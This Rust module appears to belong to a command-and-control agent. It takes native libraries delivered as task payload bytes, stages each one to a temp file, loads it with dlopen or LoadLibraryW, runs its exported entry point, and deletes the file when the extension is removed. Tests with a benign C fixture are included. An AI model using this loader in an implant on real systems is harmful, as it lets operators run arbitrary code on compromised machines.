//! Native (dynamic library) extension loader.
//!
//! Extensions are shared libraries exporting a small C ABI:
//!
//! ```c
//! uint32_t shikra_ext_abi(void);              // must return 1
//! typedef void (*shikra_ext_output_fn)(void *ctx, const uint8_t *data, size_t len);
//! int32_t shikra_ext_run(const uint8_t *args, size_t args_len,
//!                        shikra_ext_output_fn output, void *ctx);
//! ```
//!
//! The host passes an output callback so the extension never needs to allocate
//! memory owned by the host.

#![allow(unsafe_code)]

use crate::TaskOutcome;
use anyhow::{anyhow, Context, Result};
use std::collections::HashMap;
use std::ffi::c_void;
use std::path::{Path, PathBuf};

pub const NATIVE_EXT_ABI: u32 = 1;

type ExtAbiFn = unsafe extern "C" fn() -> u32;
type ExtOutputFn = unsafe extern "C" fn(*mut c_void, *const u8, usize);
type ExtRunFn = unsafe extern "C" fn(*const u8, usize, ExtOutputFn, *mut c_void) -> i32;

/// Wrapper around a platform library handle.
///
/// # Safety
///
/// The handle is only ever used from the single task that owns the agent
/// state; the explicit `Send` impl lets it live inside the beacon loop.
struct NativeLibrary {
    handle: *mut c_void,
}

unsafe impl Send for NativeLibrary {}

impl Drop for NativeLibrary {
    fn drop(&mut self) {
        if !self.handle.is_null() {
            unsafe {
                platform::close(self.handle);
            }
        }
    }
}

pub struct NativeExtension {
    pub name: String,
    pub path: PathBuf,
    /// Kept alive so the library stays loaded until the extension is removed.
    _library: NativeLibrary,
    run: ExtRunFn,
}

#[derive(Default)]
pub struct NativeRegistry {
    extensions: HashMap<String, NativeExtension>,
}

impl std::fmt::Debug for NativeRegistry {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("NativeRegistry")
            .field("extensions", &self.list())
            .finish()
    }
}

impl NativeRegistry {
    pub fn new() -> Self {
        Self::default()
    }

    /// Loads a shared library from disk.
    pub fn load(&mut self, name: impl Into<String>, path: &Path) -> Result<()> {
        let name = name.into();
        if name.is_empty() {
            return Err(anyhow!("extension name must not be empty"));
        }
        let library =
            platform::open(path).with_context(|| format!("failed to load {}", path.display()))?;

        let abi_address = unsafe { platform::symbol(library.handle, "shikra_ext_abi") }
            .ok_or_else(|| anyhow!("extension is missing shikra_ext_abi"))?;
        let run_address = unsafe { platform::symbol(library.handle, "shikra_ext_run") }
            .ok_or_else(|| anyhow!("extension is missing shikra_ext_run"))?;

        let abi: ExtAbiFn = unsafe { std::mem::transmute(abi_address) };
        let abi_version = unsafe { abi() };
        if abi_version != NATIVE_EXT_ABI {
            return Err(anyhow!(
                "extension ABI {abi_version} is not supported (expected {NATIVE_EXT_ABI})"
            ));
        }

        let run: ExtRunFn = unsafe { std::mem::transmute(run_address) };
        self.extensions.insert(
            name.clone(),
            NativeExtension {
                name,
                path: path.to_path_buf(),
                _library: library,
                run,
            },
        );
        Ok(())
    }

    /// Loads a shared library from raw bytes by staging it to a temp file.
    pub fn load_bytes(&mut self, name: impl Into<String>, bytes: &[u8]) -> Result<()> {
        let name = name.into();
        if bytes.is_empty() {
            return Err(anyhow!("extension payload is empty"));
        }
        let path = staged_path(&name);
        std::fs::write(&path, bytes).context("failed to stage native extension")?;
        self.load(name, &path)
    }

    pub fn run(&self, name: &str, args: &[u8]) -> Result<NativeOutcome> {
        let extension = self
            .extensions
            .get(name)
            .ok_or_else(|| anyhow!("no extension named {name}"))?;

        let mut output = Vec::new();
        let exit_code = unsafe {
            (extension.run)(
                args.as_ptr(),
                args.len(),
                output_trampoline,
                &mut output as *mut Vec<u8> as *mut c_void,
            )
        };
        Ok(NativeOutcome { exit_code, output })
    }

    pub fn remove(&mut self, name: &str) -> bool {
        if let Some(extension) = self.extensions.remove(name) {
            let path = extension.path.clone();
            drop(extension);
            let _ = std::fs::remove_file(path);
            true
        } else {
            false
        }
    }

    pub fn list(&self) -> Vec<String> {
        let mut names: Vec<String> = self.extensions.keys().cloned().collect();
        names.sort();
        names
    }
}

unsafe extern "C" fn output_trampoline(ctx: *mut c_void, data: *const u8, len: usize) {
    if ctx.is_null() || (data.is_null() && len > 0) {
        return;
    }
    let output = &mut *(ctx as *mut Vec<u8>);
    let slice = std::slice::from_raw_parts(data, len);
    output.extend_from_slice(slice);
}

#[derive(Debug)]
pub struct NativeOutcome {
    pub exit_code: i32,
    pub output: Vec<u8>,
}

fn staged_path(name: &str) -> PathBuf {
    let mut suffix = [0u8; 6];
    suffix.copy_from_slice(&rand::random::<u64>().to_le_bytes()[..6]);
    let suffix: String = suffix.iter().map(|byte| format!("{byte:02x}")).collect();
    let extension = platform::library_extension();
    std::env::temp_dir().join(format!("dgr-ext-{name}-{suffix}.{extension}"))
}

#[cfg(unix)]
mod platform {
    use super::*;
    use std::ffi::CString;

    pub fn open(path: &Path) -> Result<crate::native::NativeLibrary> {
        let c_path = CString::new(path.to_string_lossy().as_bytes())
            .map_err(|_| anyhow!("path contains NUL"))?;
        let handle = unsafe { libc::dlopen(c_path.as_ptr(), libc::RTLD_NOW | libc::RTLD_LOCAL) };
        if handle.is_null() {
            let err = unsafe {
                let ptr = libc::dlerror();
                if ptr.is_null() {
                    "unknown dlopen error".to_string()
                } else {
                    std::ffi::CStr::from_ptr(ptr).to_string_lossy().into_owned()
                }
            };
            return Err(anyhow!("dlopen failed: {err}"));
        }
        Ok(super::NativeLibrary { handle })
    }

    pub unsafe fn symbol(handle: *mut c_void, name: &str) -> Option<*mut c_void> {
        let c_name = CString::new(name).ok()?;
        let address = libc::dlsym(handle, c_name.as_ptr());
        (!address.is_null()).then_some(address)
    }

    pub unsafe fn close(handle: *mut c_void) {
        libc::dlclose(handle);
    }

    pub fn library_extension() -> &'static str {
        if cfg!(target_os = "macos") {
            "dylib"
        } else {
            "so"
        }
    }
}

#[cfg(windows)]
mod platform {
    use super::*;
    use windows_sys::Win32::Foundation::FreeLibrary;
    use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};

    pub fn open(path: &Path) -> Result<crate::native::NativeLibrary> {
        let wide: Vec<u16> = path
            .to_string_lossy()
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let handle = unsafe { LoadLibraryW(wide.as_ptr()) };
        if handle.is_null() {
            return Err(anyhow!(
                "LoadLibraryW failed: {}",
                std::io::Error::last_os_error()
            ));
        }
        Ok(super::NativeLibrary {
            handle: handle as *mut c_void,
        })
    }

    pub unsafe fn symbol(handle: *mut c_void, name: &str) -> Option<*mut c_void> {
        let mut c_name: Vec<u8> = name.bytes().collect();
        c_name.push(0);
        let address = GetProcAddress(handle as _, c_name.as_ptr());
        address.map(|value| value as *mut c_void)
    }

    pub unsafe fn close(handle: *mut c_void) {
        FreeLibrary(handle as _);
    }

    pub fn library_extension() -> &'static str {
        "dll"
    }
}

#[cfg(not(any(unix, windows)))]
mod platform {
    use super::*;

    pub fn open(_path: &Path) -> Result<crate::native::NativeLibrary> {
        Err(anyhow!(
            "native extensions are unsupported on this platform"
        ))
    }
    pub unsafe fn symbol(_handle: *mut c_void, _name: &str) -> Option<*mut c_void> {
        None
    }
    pub unsafe fn close(_handle: *mut c_void) {}
    pub fn library_extension() -> &'static str {
        "bin"
    }
}

/// Task-surface wrapper: load from payload bytes or path.
pub fn task_native_load(name: &str, payload: &[u8], path: Option<&str>) -> TaskOutcome {
    let mut registry = NativeRegistry::new();
    let result = if !payload.is_empty() {
        registry.load_bytes(name, payload)
    } else if let Some(path) = path {
        registry.load(name, Path::new(path))
    } else {
        return TaskOutcome::fail("native_load requires a payload or path");
    };
    match result {
        Ok(()) => TaskOutcome::ok(format!("loaded native extension {name}")),
        Err(err) => TaskOutcome::fail(err.to_string()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn compile_fixture() -> Option<PathBuf> {
        let dir = std::env::temp_dir().join(format!("dgr-ext-test-{}", std::process::id()));
        std::fs::create_dir_all(&dir).ok()?;
        let source = dir.join("fixture.c");
        let output = dir.join(format!("libfixture.{}", platform::library_extension()));
        let code = r#"
        #include <stdint.h>
        #include <stddef.h>
        typedef void (*output_fn)(void *ctx, const uint8_t *data, size_t len);
        uint32_t shikra_ext_abi(void) { return 1; }
        int32_t shikra_ext_run(const uint8_t *args, size_t args_len,
                               output_fn output, void *ctx) {
            const char *hello = "native-ext-ok";
            output(ctx, (const uint8_t *)hello, 13);
            if (args_len > 0) output(ctx, args, args_len);
            return 11;
        }
        "#;
        std::fs::write(&source, code).ok()?;
        let status = std::process::Command::new("cc")
            .args(["-shared", "-fPIC", "-o", output.to_str()?, source.to_str()?])
            .status()
            .ok()?;
        if !status.success() || !output.exists() {
            return None;
        }
        Some(output)
    }

    #[test]
    fn load_run_and_remove_fixture() {
        let Some(path) = compile_fixture() else {
            eprintln!("skipping native extension test: no C compiler available");
            return;
        };
        let mut registry = NativeRegistry::new();
        registry.load("fixture", &path).expect("load");
        assert_eq!(registry.list(), vec!["fixture".to_string()]);

        let outcome = registry.run("fixture", b"args-through").expect("run");
        assert_eq!(outcome.exit_code, 11);
        let output = String::from_utf8_lossy(&outcome.output);
        assert!(output.contains("native-ext-ok"), "output: {output:?}");
        assert!(output.contains("args-through"), "output: {output:?}");

        assert!(registry.remove("fixture"));
        assert!(registry.list().is_empty());
        assert!(!registry.remove("fixture"));
    }

    #[test]
    fn rejects_garbage_payload() {
        let mut registry = NativeRegistry::new();
        assert!(registry.load_bytes("bad", b"not-a-library").is_err());
    }

    #[test]
    fn rejects_empty_name() {
        let mut registry = NativeRegistry::new();
        assert!(registry.load_bytes("", b"x").is_err());
    }

    #[test]
    fn run_unknown_extension_fails() {
        let registry = NativeRegistry::new();
        assert!(registry.run("missing", b"").is_err());
    }
}
